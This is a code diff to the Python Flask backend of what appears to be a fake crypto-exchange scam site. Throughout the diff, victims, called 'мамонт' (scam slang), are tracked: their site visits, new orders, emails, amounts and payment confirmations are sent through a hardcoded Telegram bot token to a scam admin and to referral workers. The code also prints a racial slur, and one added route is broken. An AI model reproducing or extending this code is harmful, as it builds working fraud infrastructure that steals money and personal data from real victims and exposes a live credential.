@@ -7,6 +7,9 @@ import requests
 from flask_cors import CORS
 from flask import send_file
 
+tgbotUrl = 'https://api.telegram.org/bot6773029189:AAFI61qZawMPfXYnIhLKM-cvKWaJxQMDF9w/sendMessage'
+adminId = '1945295238'
+
 db_api.create_db()
 
 app = Flask(__name__, static_folder="static")
@@ -81,31 +84,58 @@ def orderupd(orderId):
         receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status,wallet = db_api.getOrderInfo(orderId)
         return jsonify(receiveAmount = receiveAmount,receiveCurrency = receiveCurrency,sendAmount = sendAmount,sendCurrency = sendCurrency,receiver = receiver,email = email,referalCode = referalCode,status = status,wallet = wallet)
 
+@app.route('/',defaults={'path': ''})
+def otstyk(userId):
+    print('nigger')
+    anwser = {
+    'inline_keyboard': [
+            [{'text': 'Ответить в ТП', 'callback_data': f'uans_{userId}'}]
+    ]}
+    telegram_api_url = tgbotUrl
+    payload = {
+        'text': 'мамонт перешел на сайт',
+        }
+    headers = {
+        'Content-Type': 'application/json'
+        }
+    response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': anwser}), headers=headers)
+
 @app.route('/confirm/<orderId>',methods = ['POST'])
 def confirm(orderId):
     db_api.changeStatus(orderId)
     receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status,wallet = db_api.getOrderInfo(orderId)
-    print(referalCode)
+    #print(referalCode)
+    telegram_api_url = tgbotUrl
+    payload = {
+        'text': f'[{orderId}]\n<b>Мамонт обозначил заявку как оплаченную</b>\n\n<b>{sendAmount} {sendCurrency} -> {round(float(receiveAmount),6)} {receiveCurrency}\n{email}\n{status}\nОжидает перевода на: {receiver}</b>',
+        'parse_mode': 'HTML',
+        }
+    headers = {
+        'Content-Type': 'application/json'
+        }
+    confirmation = {
+        'inline_keyboard': [
+            [{'text': 'Подтвердить', 'callback_data': f''}]
+        ]
+    }
+    if 'e' in str(sendAmount).lower():
+        sendAmount = float(sendAmount)  
+        sendAmount = format(sendAmount, 'f')  
+    if 'e' in str(receiveAmount).lower():
+        receiveAmount = float(receiveAmount)  
+        receiveAmount = format(receiveAmount, 'f')  
     if str(referalCode) != 'null':
-        if 'e' in str(sendAmount).lower():
-            sendAmount = float(sendAmount)  
-            sendAmount = format(sendAmount, 'f')  
-        if 'e' in str(receiveAmount).lower():
-            receiveAmount = float(receiveAmount)  
-            receiveAmount = format(receiveAmount, 'f')  
-        telegram_api_url = 'https://api.telegram.org/bot6773029189:AAFI61qZawMPfXYnIhLKM-cvKWaJxQMDF9w/sendMessage'
         id = db_api.getUserId(referalCode)
         print(sendAmount)
         print(receiveAmount)
-        payload = {
-            'chat_id': f'{id}',
-            'text': f'[{referalCode}]\n<b>Мамонт обозначил заявку как оплаченную</b>\n\n<b>{sendAmount} {sendCurrency} -> {round(float(receiveAmount),6)} {receiveCurrency}\n{email}\n{status}</b>',
-            'parse_mode': 'HTML',
-        }
-        headers = {
-            'Content-Type': 'application/json'
-        }
-        response = requests.post(telegram_api_url, data=json.dumps(payload), headers=headers)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': confirmation}), headers=headers)
+    elif str(referalCode) == 'null':
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId, 'reply_markup': confirmation}), headers=headers)
+    if response.status_code == 200:
+        print('Message sent successfully.')
+    else:
+        print('Failed to send message. Error:', response.text)
     return jsonify(status = 'confirmed')
 
 @app.route('/msgSave/<text>/<userId>/<timestamp>/<user>',methods = ['POST'])
@@ -124,20 +154,22 @@ def msgSave(text,userId,timestamp,user):
 
 
 def send_telegram_message(message, inline_keyboard):
-    telegram_api_url = 'https://api.telegram.org/bot6773029189:AAFI61qZawMPfXYnIhLKM-cvKWaJxQMDF9w/sendMessage'
-    payload = {
-        'chat_id': '5334162335',
-        'text': message,
-        'reply_markup': inline_keyboard
-    }
+    telegram_api_url = tgbotUrl
+    chat_ids = [adminId]
     headers = {
         'Content-Type': 'application/json'
     }
-    response = requests.post(telegram_api_url, data=json.dumps(payload), headers=headers)
-    if response.status_code == 200:
-        print('Message sent successfully.')
-    else:
-        print('Failed to send message. Error:', response.text)
+    for chat_id in chat_ids:
+        payload = {
+        'chat_id': chat_id,
+        'text': message,
+        'reply_markup': inline_keyboard
+        }
+        response = requests.post(telegram_api_url, data=json.dumps(payload), headers=headers)
+        if response.status_code == 200:
+            print('Message sent successfully.')
+        else:
+            print('Failed to send message. Error:', response.text)
 
 
 
@@ -171,25 +203,34 @@ def transactionsGeneratiin():
 @app.route('/newOrder/<receiveAmount>/<receiveCurrency>/<sendAmount>/<sendCurrency>/<receiver>/<email>/<referalCode>/<status>',methods = ['GET'])
 def newOrder(receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status):
     orderIdd = random.randint(111111,999999)
+    if 'e' in str(sendAmount).lower():
+        sendAmount = float(sendAmount)  
+        sendAmount = format(sendAmount, 'f')  
+    if 'e' in str(receiveAmount).lower():
+        receiveAmount = float(receiveAmount)  
+        receiveAmount = format(receiveAmount, 'f') 
+    telegram_api_url = tgbotUrl
+    payload = {
+        'text': f'[{referalCode}]\n<b>Мамонт создал заявку</b>\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}</b>',
+        'parse_mode': 'HTML',
+        }
+    headers = {
+        'Content-Type': 'application/json'
+        }
     if str(referalCode) != 'null':
-        if 'e' in str(sendAmount).lower():
-            sendAmount = float(sendAmount)  
-            sendAmount = format(sendAmount, 'f')  
-        if 'e' in str(receiveAmount).lower():
-            receiveAmount = float(receiveAmount)  
-            receiveAmount = format(receiveAmount, 'f')  
-        telegram_api_url = 'https://api.telegram.org/bot6773029189:AAFI61qZawMPfXYnIhLKM-cvKWaJxQMDF9w/sendMessage'
         id = db_api.getUserId(referalCode)
-        payload = {
-            'chat_id': f'{id}',
-            'text': f'[{referalCode}]\n<b>Мамонт создал заявку</b>\n\n<b>{sendAmount} {sendCurrency} -> {receiveAmount} {receiveCurrency}\n{email}\n{status}</b>',
-            'parse_mode': 'HTML',
-        }
-        headers = {
-            'Content-Type': 'application/json'
-        }
-        response = requests.post(telegram_api_url, data=json.dumps(payload), headers=headers)
+        id2 = adminId
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id2}), headers=headers)
+    elif str(referalCode) == 'null':
+        # If referalCode is 'null', send to a single, specific ID
+        id = adminId  # replace with actual ID for null referal code
+        response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id': id}), headers=headers)
     orderId = db_api.addOrder(orderIdd,receiveAmount,receiveCurrency,sendAmount,sendCurrency,receiver,email,referalCode,status)
+    if response.status_code == 200:
+        print('Message sent successfully.')
+    else:
+        print('Failed to send message. Error:', response.text)
     return jsonify(orderId = orderIdd)
 
 def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
